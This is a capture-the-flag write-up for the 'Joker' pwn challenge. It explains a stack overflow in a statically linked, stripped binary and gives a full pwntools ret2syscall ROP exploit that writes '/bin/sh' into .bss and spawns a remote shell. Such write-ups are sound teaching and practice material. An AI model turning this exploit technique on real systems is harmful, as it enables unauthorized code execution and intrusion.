# Joker - pwn

## Description

Classic.

----
Connect to the service with: `nc challenges.hackrocks.com 20002`

Found the seg fault place:
```bash=
Why did the packet cross the wire?
To get to the other port... XD
Did you like the joke? yes
Leave a review then!
Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Review: Review received. Have a nice day! :)
zsh: segmentation fault  ./joker
```

main function

![](https://note.rootams.nl/pad/uploads/a549b3c1-cbed-4a65-ba80-36de6bdd6e78.png)

The binary has been statically linked, rendering ret2libc impossible. The binary has been stripped, so function names cant be read. The functions look like libc functions so with some analysis we can fill out most function names:


![](https://note.rootams.nl/pad/uploads/b8abb548-d314-45e4-baca-fb0852badcde.png)


# Approach
We can overflow the name and thereby also the review buffer and follow this up with a ropchain. If we inspect the ROPgadgets we can see we that we have the right gadgets to perform a ret2syscall. Since the binary does not contain a string for /bin/sh we need to somehow also write this into the binary using the ropchain. The rop chain is composed of 5 parts.

1. the padding
2. setting up the registers for read() into a writable section (.bss)
3. executing read (inputting the "/bin/sh")
4. setting up registers for syscall
5. making syscall and getting shell


The code looks as follows:

```python=
#!/usr/bin/env python3
from pwn import *



host = "challenges.hackrocks.com"
port = 20002
r = remote(host, port)


exe = './joker'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

pop_rax = 0x43d90c
pop_rdi = 0x401716
pop_rsi =0x406988
pop_rdx = 0x43cf95
syscall = 0x402354
read = 0x43cf80 #FUN_0043cf80 AKA read()
bss = elf.bss() #Any writeable area is good



offset = 102
payload = flat(
    b"e" * offset,
    #Setting up registers for read()
    pop_rdi,
    0x0,
    pop_rsi,
    bss,
    pop_rdx,
    0x8,
    pop_rax,
    bss,
    #executing read()
    read,
    #setting up register for syscall
    pop_rax, 59,
    pop_rdi, bss,
    pop_rsi, 0,
    pop_rdx, 0,
    #pwn
    syscall
)


r.readuntil("Did you like the joke? ")
r.sendline("yes")
r.readuntil("Name: ")
r.sendline(payload)
#reading /bin/sh into .bss
r.sendline("/bin/sh\x00")
#shell
r.interactive()
```
